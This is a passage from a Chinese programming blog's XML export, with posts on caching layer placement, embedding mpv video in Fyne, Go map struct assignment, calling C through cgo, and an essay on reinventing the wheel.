<li><strong>可重用性</strong>：不同的service可能需要相同的数据。如果缓存在repository层实现，可以跨多个service重用缓存，而无需复制逻辑。如果有多个Service或Use Case需要访问相同的数据，它们都可以自动从缓存中受益，而不需要每次都实现缓存逻辑。</li>
</ul>
<p><em>缺点</em>:</p>
<ul>
<li><strong>缺乏灵活性</strong>：并不是所有service都需要缓存数据，可能对某些业务逻辑来说，总是从缓存中获取数据并不合适。例如，某些业务逻辑可能需要最新的、未缓存的数据。</li>
</ul>
<h3 id="在Service层中使用缓存"><a href="#在Service层中使用缓存" class="headerlink" title="在Service层中使用缓存"></a>在Service层中使用缓存</h3><p><em>优点</em>:</p>
<ul>
<li><strong>细粒度控制</strong>：可以根据特定的使用场景来调整缓存，从而在数据缓存的时间和方式上具有更大的灵活性。提供了更大的灵活性。业务逻辑可以决定何时使用缓存，何时直接从数据源获取。对于需要特定缓存策略的复杂业务逻辑，这种方法更为合适。</li>
<li><strong>优化性能</strong>：只有最关键的操作可能需要缓存，将这个逻辑放在service层可以针对性地提高性能。</li>
</ul>
<p><em>缺点</em>:</p>
<ul>
<li><strong>潜在的重复</strong>：如果多个Service或Use Case都需要缓存逻辑，可能会导致代码重复。</li>
<li><strong>复杂性</strong>：在service层引入缓存可以使业务逻辑变得复杂，使得service层不仅要负责业务规则，还要负责数据缓存。</li>
</ul>
<h2 id="我的看法"><a href="#我的看法" class="headerlink" title="我的看法"></a>我的看法</h2><p>我倾向于将缓存逻辑放在Repository层。这样可以确保数据的来源对上层是透明的，并减少代码重复。但是，这并不是一种<strong>一刀切</strong>的策略。在某些情况下，特别是当业务逻辑有特定的缓存需求时，将缓存逻辑放在Service层或Use Case层可能更为合适。</p>
<p>关键是要确保你的选择能够满足项目的需求，同时还要考虑到代码的维护性和可读性。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol>
<li>咖啡拿铁(2018). <a href="https://juejin.cn/post/6844903636334542856">你的项目应该如何正确分层?</a></li>
<li>Bigbyto(2019). <a href="https://wiyi.org/dao-vs-repository.html">DAO还是Repository,傻傻的分不清?</a>.</li>
<li>inktiger(2021). <a href="https://www.v2ex.com/t/749812">Redis 一般放在 controller 还是 service 呢?</a>.</li>
<li>洋芋土豆(2016). <a href="https://segmentfault.com/q/1010000004825046">Redis放在控制器还是模型层?</a>.</li>
</ol>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>scene-series</tag>
        <tag>microservices</tag>
      </tags>
  </entry>
  <entry>
    <title>在Fyne.io中集成mpv进行媒体播放</title>
    <url>/articles/coding/use-libmpv-in-fyne-gui-framework/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>在我的一个<a href="https://github.com/AynaLivePlayer/AynaLivePlayer">项目</a>中，，我需要在Fyne编写的GUI中播放视频。然而Fyne这个框架原生并不支持视频播放，所以我引入了MPV作为视频解码与播放的库。</p>
<p>为了将MPV的输出集成到Fyne的GUI中，我可以通过设置MPV的wid选项来控制。在Windows上，这个WID就是Windows<br>handle id (HWND)。 在Linux中，这个ID通常为X11的window id。</p>
<p>然而，Fyne同样不支持直接获取window id。为了实现这个功能，我们需要对Fyne进行一些修改，具体修改如下。</p>
<span id="more"></span>

<h2 id="修改Fyne源码"><a href="#修改Fyne源码" class="headerlink" title="修改Fyne源码"></a>修改Fyne源码</h2><p>首先，在window_windows.go文件中，添加以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (w *window) Wid() uintptr &#123;</span><br><span class="line">    w.viewLock.RLock()</span><br><span class="line">    defer w.viewLock.RUnlock()</span><br><span class="line"></span><br><span class="line">    if w.closing &#123;</span><br><span class="line">        return 0</span><br><span class="line">    &#125;</span><br><span class="line">    if (w.viewport == nil) &#123;</span><br><span class="line">        return uintptr(0)</span><br><span class="line">    &#125;</span><br><span class="line">    return uintptr(w.viewport.GetWin32Window())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来，在window_linux.go文件中，添加以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (w *window) Wid() uintptr &#123;</span><br><span class="line">    w.viewLock.RLock()</span><br><span class="line">    defer w.viewLock.RUnlock()</span><br><span class="line"></span><br><span class="line">    if w.closing &#123;</span><br><span class="line">        return 0</span><br><span class="line">    &#125;</span><br><span class="line">    if (w.viewport == nil) &#123;</span><br><span class="line">        return uintptr(0)</span><br><span class="line">    &#125;</span><br><span class="line">    return uintptr(w.viewport.GetX11Window())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><p>以下是使用修改后的Fyne源码并结合MPV库的测试代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;fyne.io/fyne/v2&quot;</span><br><span class="line">    &quot;fyne.io/fyne/v2/app&quot;</span><br><span class="line">    &quot;fyne.io/fyne/v2/theme&quot;</span><br><span class="line">    &quot;github.com/aynakeya/go-mpv&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type WindowHandleMagic interface &#123;</span><br><span class="line">    Wid() uintptr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// need to apply patch first</span><br><span class="line">func GetWindowHandle(window fyne.Window) uintptr &#123;</span><br><span class="line">    x, ok := window.(WindowHandleMagic)</span><br><span class="line">    if ok &#123;</span><br><span class="line">        return x.Wid()</span><br><span class="line">    &#125;</span><br><span class="line">    return 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    a := app.NewWithID(&quot;io.fyne.mpvdemo&quot;)</span><br><span class="line">    a.SetIcon(theme.FyneLogo())</span><br><span class="line">    window := a.NewWindow(&quot;Fyne MPV Player Demo&quot;)</span><br><span class="line">    var libmpv *mpv.Mpv = nil</span><br><span class="line">    window.Resize(fyne.NewSize(1080, 720))</span><br><span class="line">    go func() &#123;</span><br><span class="line">        wid := GetWindowHandle(window)</span><br><span class="line">        for wid == 0 &#123;</span><br><span class="line">            wid = GetWindowHandle(window)</span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Printf(&quot;got windows handle %d\n&quot;, wid)</span><br><span class="line">        libmpv = mpv.Create()</span><br><span class="line">        err := libmpv.Initialize()</span><br><span class="line">        if err != nil &#123;</span><br><span class="line">            panic(err)</span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println(libmpv.SetOptionString(&quot;wid&quot;, fmt.Sprintf(&quot;%d&quot;, wid)))</span><br><span class="line">        fmt.Println(libmpv.Command([]string&#123;&quot;loadfile&quot;, &quot;/home/aynakeya/Videos/ymca.mp4&quot;&#125;))</span><br><span class="line">    &#125;()</span><br><span class="line">    window.ShowAndRun()</span><br><span class="line">    if libmpv != nil &#123;</span><br><span class="line">        libmpv.Destroy()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img data-src="https://user-images.githubusercontent.com/32156054/238171015-a99af8ea-d311-41c4-b129-1c515eea4341.png" alt="img"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote>
<p><a href="https://github.com/fyne-io/fyne/issues/449#issuecomment-1546820151">https://github.com/fyne-io/fyne/issues/449#issuecomment-1546820151</a><br><a href="https://github.com/AynaLivePlayer/AynaLivePlayer">AynaLivePlayer</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>libmpv</tag>
        <tag>fyne</tag>
      </tags>
  </entry>
  <entry>
    <title>为什么golang不能给map中的结构体(struct)直接赋值</title>
    <url>/articles/coding/why-golang-can-t-assign-to-a-struct-field-in-map/</url>
    <content><![CDATA[<p>今天在写代码的时候遇到了一个错误,</p>
<p>在尝试编译的时候，编译器报了这个错误<code>cannot assign to struct field s.Templates[name].Template in map</code></p>
<span id="more"></span>


<h2 id="探索"><a href="#探索" class="headerlink" title="探索"></a>探索</h2><p>这里是出现问题的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type WebTemplate struct &#123;</span><br><span class="line">	Name     string</span><br><span class="line">	Template string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type TemplateStore struct &#123;</span><br><span class="line">	Templates map[string]WebTemplate</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (s *TemplateStore) Modify(name string, content string) &#123;</span><br><span class="line">	if _, ok := s.Templates[name]; ok &#123;</span><br><span class="line">		s.Templates[name].Template = content // 报错位置在这一行.</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在进行了一番搜索之后 <a href="https://stackoverflow.com/questions/32751537/why-do-i-get-a-cannot-assign-error-when-setting-value-to-a-struct-as-a-value-i">https://stackoverflow.com/questions/32751537/why-do-i-get-a-cannot-assign-error-when-setting-value-to-a-struct-as-a-value-i</a></p>
<p>看了一下，出现这个问题的原因是因为golang对map的实现所造成的。</p>
<p>因为golang的map实际上是一个可以扩展的结构体，也就是说，一个key对应的内存地址可能会因为map的扩大和缩小而产生改变</p>
<p>举个粒子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmt.Println(&amp;myMap[&quot;asdf&quot;]) // 这个时候可能是 0x0010</span><br><span class="line">... // 一堆代码</span><br><span class="line">fmt.Println(&amp;myMap[&quot;asdf&quot;]) // 这个时候可能就变成了是 0x0030</span><br></pre></td></tr></table></figure>

<p>所以，为了防止出现用户尝试赋值的时候，key所对应的内存地址发生变化，而导致赋值到错误的地址上。 就直接不让赋值给map中的struct了</p>
<h2 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h2><p>我的解决方式还是比较简单的。</p>
<p>直接把结构体<code>map[string]WebTemplate</code> 换成指针就行了 <code>map[string]*WebTemplate</code>。</p>
<p>因为这样子的话，取值的时候是取到的一个指向WebTemplate的指针地址，这个指针地址是不会变的，所以可以放心赋值。</p>
<p><strong>如果是结构体的话，他返回的是map里的一个地址，是有可能发生改变的</strong></p>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>在golang里调用c</title>
    <url>/articles/coding/zai-golang-li-diao-yong-c/</url>
    <content><![CDATA[<h1 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h1><ul>
<li><a href="#Intro">Intro</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95">使用方法</a></li>
<li><a href="#%E8%B8%A9%E5%9D%91">坑</a></li>
<li><a href="#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98">常见问题</a></li>
</ul>
<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>golang有一个贼牛的东西叫做cgo，这个可以让你在golang里运行c, 当然也可以调用c的library，总之就是很牛皮</p>
<p>cgo 官方文档: <a href="https://pkg.go.dev/cmd/cgo">https://pkg.go.dev/cmd/cgo</a></p>
<span id="more"></span>

<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>这边简单说一下golang里调用c的基本方法</p>
<h2 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h2><p>我们首先来看一下最简单的hello world. </p>
<ul>
<li>如果要使用c, 首先需要<code>import &quot;C&quot;</code>, 并且在这行代码的上面要加上对应的c code, 比如引入头文件, 定义一些函数之类的</li>
<li>调用C的函数的话就用<code>C.&lt;function name&gt;</code>, 但是要注意的是，返回的值都是C的类型。 如果要把他变成golang的类型，需要进行转换</li>
<li>调用C的函数的话，传入的参数同样必须为C的类型</li>
</ul>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">void println(char * s) &#123;</span></span><br><span class="line"><span class="comment">	printf(&quot;%s\n&quot;,s);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	C.<span class="built_in">println</span>(C.CString(<span class="string">&quot;Hello World&quot;</span>))</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="如何引入外部的C文件"><a href="#如何引入外部的C文件" class="headerlink" title="如何引入外部的C文件"></a>如何引入外部的C文件</h2><p>比如,我有一个c文件</p>
<p>a.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">println</span><span class="params">(<span class="type">char</span> * s)</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>a.h</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">println</span><span class="params">(<span class="type">char</span> * s)</span>;</span><br></pre></td></tr></table></figure>

<p>那么要在golang里调用的话就是</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#include &lt;a.h&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	C.<span class="built_in">println</span>(C.CString(<span class="string">&quot;Hello World&quot;</span>))</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="调用第三方库"><a href="#调用第三方库" class="headerlink" title="调用第三方库"></a>调用第三方库</h2><p>这里以调用<code>libmpv</code>为例子.</p>
<p>注意<code>mpv/client.h</code>以及对应的库文件(<code>mpv-2.dll</code>或者<code>libmpv.so</code>）必须在PATH环境变量中。</p>
<p>如果不在的话，需要修改LDFLAGS <code>#cgo LDFLAGS: -L./lib -lmpv</code></p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#include &lt;mpv/client.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#cgo LDFLAGS: -lmpv</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ClientApiVersion</span><span class="params">()</span></span> <span class="type">uint32</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="type">uint32</span>(C.mpv_client_api_version())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h1><p><strong>不同的系统有不同的Primitive data</strong></p>
<p>比如</p>
<p>在windows上，<code>uint64</code> 或者说 <code>long</code> 他的大小是 4 byte.<br>但是在unix&#x2F;linux上, <code>uint64</code> 的大小是 8 byte.</p>
<p>这就导致了一些问题，比如我有一个项目需要同时支持两个系统，那么当我想传入<code>uint64</code>的时候，在windows上得用<code>ulong</code>,在linux上就得用 <code>ulonglong</code>.</p>
<p>解决方式就是使用引入<code>stdint.h</code> 然后使用 <code>uint64_t</code>.</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    C.some_function(C.uint64_t(<span class="number">1000</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><p><strong>Q: 遇到<code>unexpected type: ...</code>是怎么回事呢</strong></p>
<p><code>...</code> 在c里面代表可变的函数参数，但是cgo无法识别他，所以会报错。解决方法就是写一个函数，在c里面调用这个函数，给golang的函数里就不要出现可变的部分了</p>
<p>举个例子, 比如以下情况就会出现这个报错，因为printf 里有个可变部分。<code>int printf(const char *format, ...)</code></p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	C.printf(C.CString(<span class="string">&quot;Hello World&quot;</span>))</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>[编程碎碎念] 为啥要重复造轮子</title>
    <url>/articles/coding/bian-cheng-sui-sui-nian-wei-sha-yao-zao-lun-zi/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>作为一个完全没有参加各类编程补习班，当然也不是完全没有，至少我入门编程的时候上了一段时间的Pascal的课，不过现在已经忘光了。笑。</p>
<p>我的大部分编程技能都是自学来的，这也导致了，我的编程习惯总体来说就是非常的野路子。即使现在上了一部分大学的课，但正规科班的教学依旧无法改变我的习惯。</p>
<p>那么我有一个习惯，我也不知道是好是坏，那就是<strong>造轮子</strong>，或者说的更明白一点<strong>重复造轮子</strong>。怎么说呢，我特别热衷于造轮子，即使已经有非常好的现成的项目了，我依然会尝试自己造一个。</p>
<p>为啥我这么热衷于造轮子，说实话我自己一开始也说不太明白，总觉得这样子比较好。但是随着最近和网友，同学的交流，我大概有了一些想法。</p>
<p>所以，我想记录下我的着一些想法，一方面是为了为了我自己，另一方也是为了那些或许对这方面有问题的网友和同好。</p>
<span id="more"></span>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="总之什么是轮子"><a href="#总之什么是轮子" class="headerlink" title="总之什么是轮子"></a>总之什么是轮子</h2><p>我不太知道网上具体的定义是啥。狭义来说呢，就是一个库，比如一个math库，里面有各种数学函数可以让你进行调用。</p>
<p>但是在这里我想使用一下我自己对于<strong>轮子</strong>这个词一个广义的定义，即任何一个可以实现某一个功能的项目</p>
<p>比如一个可以让你下载动漫的下载器，一个util库，这种都算一个轮子。一个轮子对我来说不单单就指一个库，他也可以是一个实现某种功能的软件或者程序程序。</p>
<h2 id="可能或许是现状"><a href="#可能或许是现状" class="headerlink" title="可能或许是现状"></a>可能或许是现状</h2><p>看到这里，你可能已经看不懂 <em>造轮子</em> 这三个字了，因为我已经看不懂了。</p>
<p>那么换一个语言，why should we <strong>Recreating the Wheel</strong>?</p>
<p>现在网上总有那么一些言论，“你在开发什么东西啊，啊，这个啊，这边有个框架，直接用这个框架就行了”。 这种论调在网上频繁出现，只要你稍微混迹在一些编程社区里，你每天至少都能看到一条。</p>
<p>这个现象在稍微小型一点的公司（或许在中大型公司）里就更容易发现了。有个网友在和我聊天时提起公司在进行开发的时候，基本就依赖于现成的框架了 （在他的公司里，就是RuoYi），通过这个框架来实现业务逻辑。</p>
<p>那么用轮子好么？我个人来说，在实际开发的时候，用框架无疑是一个非常好的选择，用现成的框架，不光你可以更快的完成开发，只关注与业务逻辑上，不用关心其他的问题，同时，框架越完善，出现重大事故的概率就越低，因为框架给你做好了大部分的工作。中小型公司喜欢使用使用框架也不是不无道理，这可以更好的压榨员工，节省开发的开支啊。</p>
<p>但是这也带来了一些的问题，what if （当然就是what if, 大框架一般不会出现这种问题）, 你想实现一个功能，但是这个框架不支持。又或者，出现了一个问题且业务逻辑部分的代码没有任何问题呢？好了，这下你除非自己深入框架内部然后定位问题，就只能给框架开发者提issue然后干等了。</p>
<p>有人会问，啊，那你为什么就不能debug框架么？这不也是代码么？你既然能写业务代码，解决这些问题不也很简单么？问题就出在这里，由于框架的出现，以及框架被大量的使用，很多人的开发完全就是基于现成框架 - 即在现有的基础上进行二次开发。再加上部分无良培训机构培训出来的流水线程序员，只学了如何调用框架。一些基础的计算机知识，框架内部具体时如何实现的完全就是一抹黑，啥都不知道。甚至于，有些做前后端开发的程序员，连http报文长什么样都不知道。</p>
<p>题外话，我当然不是说我自己有多么多么厉害，了解多么多么的深入，我自己也只是知道皮毛。而我也并不是说你必须知道http报文，但是你得至少知道http报文大概长什么样子。如何不用任何一个请求框架，单纯通过tcp链接来执行http请求吧。</p>
<p>举一些更为极端的例子，现在有些人似乎把一门框架当成了一门技术，就比如 （你会vue么？）。 我的理解是，框架是基于一个编程模型在一门编程语言里的具体实现，总的来说，他就是一堆别人写的代码。把一堆别人写好的代码当作一门技术是否有点本末倒置了。</p>
<p>再者，如果一个人自己长期使用于这个框架，他就把自己限制在这个框架能做的东西里面了，逐渐的他除了知道怎么在这个框架中编程，其余就基本属于一问三不知的状态了。这个时候，要是这个框架做了一个升级，或者这个框架不让人用了。那么一切的东西都要从头开始学起。</p>
<p>说到底，框架&#x2F;轮子 对于我们来说只能是工具！而看现状来说，很多人都做了框架的工具。在我看来，这一点是非常愚蠢的。</p>
<h2 id="为什么要重新造轮子"><a href="#为什么要重新造轮子" class="headerlink" title="为什么要重新造轮子"></a>为什么要重新造轮子</h2><p>首先一点要声明的是，我在这里说的是<strong>造</strong>轮子，而不是<strong>发明</strong>轮子。你要是有这个能力发明轮子，我估计你也看不起我写的这勾八文章了。</p>
<p>所以，在造轮子的时候，借鉴前人造好的轮子是一个非常重要且不可避免的过程。</p>
<p>再来说说为什么要重新造轮子。</p>
<p>首先，也是最主要的一点就是造轮子可以让你从头到尾了解一个项目是怎么运行起来的，而不是只知道众多步骤步骤中的其中一步。简单来说就是这个项目具体是怎么实现的。</p>
<p>很多人可能认为这些东西是没有必要的，就像部分网友说的，“我只需要知道冰箱会制冷就行了，而不需要知道冰箱是怎么制冷的”。雀氏，作为一个普通人，我们只要知道会使用冰箱就可以了，这足以实现我们日常生活所需，比如，把肉放冷冻，把菜放冷藏。万一冰箱坏了，你可以找人修，你雀氏可以不用了解冰箱的工作方式。虽然需要付出一点时间，一点金钱，结果来说依旧可以解决。 但是，假如你稍微懂那么一点冰箱是怎么制冷的，比如，主要的部件是哪几个。那么，如果冰箱坏了，你甚至可以自己尝试换掉可能坏了的零件并尝试修复它。就成本来说，这不比请人来修低好多。</p>
<p>那么，和冰箱类似，写程序也是一个道理。如果你稍微了解了一下这个框架&#x2F;程序它内部的逻辑是怎么样的，遇到问题的时候至少大概会有一个想法知道是哪块地方出了问题，而不是一头雾水不知道哪里出了问题。假如你了解的在深入一点，或许就能找到诱发bug的原因，然后尝试进行修复了。再说了，冰箱坏掉的几率，可比你在一个程序&#x2F;框架时会遇到bug的几率小太多了。同样，制作造一个简单的轮子也比造一个冰箱简单多了。</p>
<p>然后就是在造轮子的时候你会学到很多普适性的知识，其中的很多东西你甚至可以用到其他地方。</p>
<p>前面也说了，我们的目的应该是<strong>造轮子</strong>，在这个过程中，我们必然会去借鉴前人造好的轮子。这对于我们来说无疑是一个完美的学习机会，不仅可以培养快速阅读代码的能力，在代码里你可以进一步的看到某些功能中所使用的数据结构，小功能的实现方法之类的。同时，你还可以进一步对这些东西进行学习。</p>
<p>就拿一个最简单的例子来说吧，如何判断一个字符串是不是网页链接。这个是我在研究<code>django</code>的时候看见的，一个判断是否是url的正则匹配。（我把它复制粘贴了下来，然后用golang重新实现了）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func IsUrl(url string) bool &#123;</span><br><span class="line">	urlRegExp := regexp.MustCompile(</span><br><span class="line">		&quot;(?i)^(?:http|ftp)s?://&quot; +</span><br><span class="line">			&quot;(?:(?:[A-Z0-9](?:[A-Z0-9-]&#123;0,61&#125;[A-Z0-9])?\\.)+(?:[A-Z]&#123;2,6&#125;\\.?|[A-Z0-9-]&#123;2,&#125;\\.?)|&quot; +</span><br><span class="line">			&quot;localhost|&quot; +</span><br><span class="line">			&quot;\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;)&quot; +</span><br><span class="line">			&quot;(?::\\d+)?&quot; +</span><br><span class="line">			&quot;(?:/?|[/?]\\S+)$&quot;)</span><br><span class="line">	return urlRegExp.FindString(url) != &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>更进一步说，写轮子可以培养<em>critical thinking</em>，你在写轮子，借鉴别人的代码的时候必然会想到，“欸，这个功能为什么是用方法A这样实现的，为什么没有用方法B，没有更好的办法了？” 这之类的的问题。</p>
<p>对于我来说，我经常会这么做。看到不明白的东西，会自己尝试用自己的方法试一试，看看自己的方法行不行。虽然大部分情况下，也不说大部分了，几乎是99%的情况下，最后发现还是别人写的好用。有些人可能会觉得，啊，这有意义么，这不是浪费时间么。我觉得不是的，这其实是一个试错的过程，会让你知道为什么某个方法可以，为什么每个方法不行，哪个方法适合那种情况。那么在你下次遇到类似的问题的时候，大概就知道要做什么了。</p>
<p>怎么说的，总的来说就是经验的累积吧。</p>
<h2 id="那么如何开始呢"><a href="#那么如何开始呢" class="headerlink" title="那么如何开始呢"></a>那么如何开始呢</h2><p>每个人都有自己的理解，有自己的学习方式。我无法提供一个适合所有人的方法。在这里我仅仅讨论我自己是怎么做的。</p>
<p>首先，我想说的就是自己造一个轮子不需要从非常底层开始做起，你可以从使用别人的框架开始慢慢深入。因为你最开始是根本没有这个能力的。而且，如果一开始就从最底层做起的话，这个花费的时间和获得的反馈不成正比，得不到正反馈，往往会丧失继续造轮子的动力。</p>
<p>就拿我自己的一个爬虫框架作为例子吧 <a href="https://github.com/aynakeya/deepcolor">deepcolor</a>，爬虫麻，肯定要对付多种信息格式。比如html,json,text。那么对于html,json这种需要从解析文本的结果，我们可以先不用自己整一个什么json解析器。这要做起来花费的时间就太大了。而我做的就是写了一个统一的接口，那么在处理不同的信息格式的时候可以使用同一套api，然后我的轮子按照对应的格式调用别人写好的解析器，并返回结果。</p>
<p>等之后有能力了，就可以慢慢的把用到的别人的轮子改成自己写的轮子。还是这个项目，最开始，我实现等待队列的方式是使用别人的代码，后来，因为自己的一些需要，我慢慢就重新写了一个自己的等待队列来替换掉别人的轮子。</p>
<p>还有就是，写框架&#x2F;轮子这个东西是一个循序渐进的过程，千万不好不需要一下子把所有功能从一开始就定下来。可以从最开始的一个demo，慢慢往上面添加东西，或者说到了某一个时间段发现前面写的东西太垃圾了，就进行一次重构。或者当你学到了一点新的东西，你感觉可以用在这个项目上时，在想办法</p>
<p>还是拿我的爬虫框架作为例子，最开始只有一个json解析器，后来慢慢添加了html和正则的解析器。大致完成了解析器的部分之后又慢慢的把多线程请求，请求池之类的给加上了。</p>
<p>所以说，不要害怕造轮子，一步步慢慢来就行了。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>最近在和网友已经一些身边的人交流的时候，脑子里会突然冒出一些关于编程的想法。但真想要明确表达的时候，有不是很好表达。想了想，大概是我太久没有写过长文章的缘故。</p>
<p>说实话，因为现在大部分作业，工作都在电脑上完成了，甚至做笔记都在使用电脑。加上长期不使用中文，我的中文水平感觉已经只有小学生水平了(笑。</p>
<p>总之，为了更好的把我自己的想法记录下来，顺便也重新锻炼一下写长文章的能力，决定开设一个新的项目，那就是<strong>编程碎碎念</strong>。 为什么要叫碎碎念呢，因为我的语文水平不支持我写出一长段连贯的文字。而且我的想法大多数时刻都比较跳跃，不是以连续的形态出现的，所以，出现在我文章中的句子大概都是一小段一小段的想法。</p>
<p>总之说了这么多，基本上就是我为啥要写博客的原因。</p>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>碎碎念</tag>
      </tags>
  </entry>
  <entry>
    <title>ceshi</title>
    <url>/articles/blogarchive/2018-09-19-11-06-38/</url>
    <content><![CDATA[<p>ceshi</p>
]]></content>
      <categories>
        <category>保护</category>
      </categories>
  </entry>
  <entry>
    <title>hello</title>
    <url>/articles/blogarchive/2018-09-29-01-59-09/</url>
    <content><![CDATA[<p>#HelloWorld<br><em>HelloWorld</em></p>
<ul>
<li>hello</li>
<li>hello</li>
<li>hello</li>
</ul>
]]></content>
      <categories>
        <category>系统默认</category>
      </categories>
  </entry>
  <entry>
    <title>Is it useful?</title>
    <url>/articles/blogarchive/2018-09-29-02-05-47/</url>
